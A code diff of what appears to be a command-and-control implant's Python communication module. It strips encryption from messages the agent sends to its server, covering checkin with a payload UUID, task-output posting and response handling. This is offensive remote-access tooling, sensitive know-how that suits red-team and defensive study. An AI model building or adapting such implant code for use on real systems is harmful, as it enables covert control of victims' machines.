@@ -5,7 +5,6 @@ import threading, queue
 
 CHUNK_SIZE = 51200
 
-CRYPTO_MODULE_PLACEHOLDER
 
     """
     Determines and returns the operating system version.
@@ -30,9 +29,9 @@ CRYPTO_MODULE_PLACEHOLDER
         Optionally uses URL-safe base64 encoding.
         """
     def formatMessage(self, data, urlsafe=False):
-        output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
+        output = base64.b64encode(self.agent_config["UUID"].encode() + json.dumps(data).encode())
         if urlsafe: 
-            output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
+            output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + json.dumps(data).encode())
         return output
 
         """
@@ -47,14 +46,14 @@ CRYPTO_MODULE_PLACEHOLDER
         This is a convenience function for sending data and receiving a structured response.
         """
     def postMessageAndRetrieveResponse(self, data):
-        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))
+        return self.formatResponse(self.makeRequest(self.formatMessage(data),'POST'))
 
         """
         Formats a message using URL-safe base64, sends it to the server using a GET request, decrypts the response, and then formats it as a JSON object.
         URL-safe base64 is often used for GET requests to avoid issues with special characters in URLs.
         """
     def getMessageAndRetrieveResponse(self, data):
-        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))
+        return self.formatResponse(self.makeRequest(self.formatMessage(data, True)))
 
         """
         Constructs a message to update the server with the output of a specific task.
@@ -184,8 +183,8 @@ CRYPTO_MODULE_PLACEHOLDER
             "encryption_key": self.agent_config["enc_key"]["enc_key"],
             "decryption_key": self.agent_config["enc_key"]["dec_key"]
         }
-        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
-        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
+        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + json.dumps(data).encode())
+        decoded_data = self.makeRequest(encoded_data, 'POST')
         if("status" in decoded_data):
             UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
             self.agent_config["UUID"] = UUID
